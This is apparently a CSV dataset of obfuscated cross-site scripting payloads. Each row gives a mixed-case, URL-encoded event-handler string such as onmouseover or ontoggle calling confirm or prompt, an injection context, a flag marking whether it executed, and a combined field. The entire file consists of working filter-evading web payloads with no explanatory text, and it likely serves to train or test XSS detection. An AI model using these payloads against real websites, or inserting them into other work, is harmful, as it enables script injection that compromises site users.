payload,context,exec,combined
<a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09ONmOUSEOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTailS%0aonpOinTERENTeR%0a=%0aconfirm()>
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
<deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
<deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>
<D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s
<HTMl%0aoNMouSeovER%0d=%0d[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0aoNMouSeovER%0d=%0d[8].find(confirm)>
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html/+/onPoiNTEReNTEr+=+confirm()//
"<HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>"
<dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>
<A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s
<d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s
<html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
<DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//
"<d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s"
<d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s
"<A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<html/+/onmoUSEOVER%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html/+/onmoUSEOVER%09=%09confirm()%0dx>
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09ONmOUSEovER+=+confirm()>v3dm0s
<DetaILS%09OntOGGlE+=+(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DetaILS%09OntOGGlE+=+(confirm)()>
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
<details%0aOntoGgLE%09=%09(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <details%0aOntoGgLE%09=%09(confirm)()%0dx//
<d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
<d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s
<DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>
<DEtaiLs%0aONTOGglE+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaiLs%0aONTOGglE+=+confirm()>
<deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//
"<D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%0doNpoINTerENteR%09=%09a=prompt,a()>v3dm0s"
<d3V%0aOnPOinTerenter%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aOnPOinTerenter%09=%09(confirm)()%0dx>v3dm0s
"<Html%0dONmOUSEOVer+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <Html%0dONmOUSEOVer+=+a=prompt,a()%0dx//"
<hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>
<a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s
<hTml%0aONPoIntEReNTER%09=%09[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%0aONPoIntEReNTER%09=%09[8].find(confirm)%0dx>
%3Cscript%3E,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag %3Cscript%3E
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
<dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//
<a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<dEtaIlS%0aONpoiNtEreNter+=+[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaIlS%0aONpoiNtEreNter+=+[8].find(confirm)//
<D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s
"<DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//"
<a/+/oNmoUSeovER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/oNmoUSeovER%09=%09confirm()>v3dm0s
<D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s
<D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09onPoinTerenteR%0a=%0a(prompt)``%0dx>v3dm0s
<A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s
<a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s
<hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%09ONMoUsEOver%0d=%0dconfirm()%0dx>
"<htmL%0aoNMoUSeOver%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <htmL%0aoNMoUSeOver%09=%09a=prompt,a()>"
<dETaIls%0aoNToggLe%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETaIls%0aoNToggLe%0d=%0dconfirm()>
<dEtaIls%09ONpOiNTEREntEr%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaIls%09ONpOiNTEREntEr%09=%09confirm()%0dx//
"<DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETAILs%09ONtoGgle%0a=%0aa=prompt,a()//"
"<D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s"
<DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
<deTAILs%0aOnpointerEntER%0d=%0d(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILs%0aOnpointerEntER%0d=%0d(confirm)()%0dx>
<detAiLS%0dONToGgLE%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAiLS%0dONToGgLE%09=%09confirm()%0dx//
<Html%0aonPOinterENter%0a=%0a[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html%0aonPOinterENter%0a=%0a[8].find(confirm)>
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
<DeTaiLs%0dONTOGgLe%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaiLs%0dONTOGgLe%09=%09[8].find(confirm)>
<A%09OnPOINtEreNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnPOINtEreNtEr%0d=%0d(confirm)()>v3dm0s
<hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML%0donPOIntEREnTER%0d=%0dconfirm()%0dx//
<A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s
<detAILs%0doNToGgLe%0d=%0d(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAILs%0doNToGgLe%0d=%0d(prompt)``//
<htMl%0doNPoInterENter%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0doNPoInterENter%09=%09confirm()//
<d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s
<HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//
<hTMl%0doNpoINtErentER+=+(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0doNpoINtErentER+=+(prompt)``%0dx//
<a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s
<html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>
confirm(1),html_text,0,CTX_html_text CTX_html_text CTX_html_text confirm(1)
<deTAIlS%09oNTogGlE+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAIlS%09oNTogGlE+=+confirm()//
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s
<A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s
<htMl%0dONMoUSEOVer%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htMl%0dONMoUSEOVer%09=%09confirm()>
<D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s
javascript:confirm`1`,url_href,1,CTX_url_href CTX_url_href CTX_url_href javascript:confirm`1`
<dEtAILs%0doNpoinTereNTeR+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAILs%0doNpoinTereNTeR+=+confirm()%0dx>
<D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s
<D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s
<d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s
"<HTMl/+/oNPOiNterenTER+=+a=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTMl/+/oNPOiNterenTER+=+a=prompt,a()//"
<dEtAILs%0doNpoinTereNTeR+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAILs%0doNpoinTereNTeR+=+confirm()%0dx>
<A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnMOuSeover%09=%09(confirm)()%0dx>v3dm0s
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//
<dEtailS%09ONtOGGle%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtailS%09ONtOGGle%09=%09[8].find(confirm)%0dx//
"<HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//"
<img src=x onerror=,html_text,0,CTX_html_text CTX_html_text CTX_html_text <img src=x onerror=
"<a%0aONmousEOver%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONmousEOver%0d=%0da=prompt,a()%0dx>v3dm0s"
<htmL%0aoNmousEoVER%0d=%0d(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0aoNmousEoVER%0d=%0d(prompt)``%0dx>
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s
<A%09OnPoinTEREntER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnPoinTEREntER%09=%09confirm()>v3dm0s
<a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s
<DetAIlS%09ONpoinTerENTER%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAIlS%09ONpoinTerENTER%09=%09confirm()//
<DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>
<D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s
<a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s
<D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONmoUsEoVER%0a=%0aconfirm()>v3dm0s
<detAIls/+/ONPOinTERenter%0d=%0d(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAIls/+/ONPOinTERenter%0d=%0d(confirm)()//
<a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09onPOInTerEnteR%09=%09(prompt)``%0dx>v3dm0s
"<D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s"
<a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s
"<HTMl/+/oNPOiNterenTER+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HTMl/+/oNPOiNterenTER+=+a=prompt,a()//"
<A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s
<hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>
<a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s
<A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s
<HTML%0aoNpoinTerENTeR+=+(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML%0aoNpoinTerENTeR+=+(prompt)``//
"<a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>
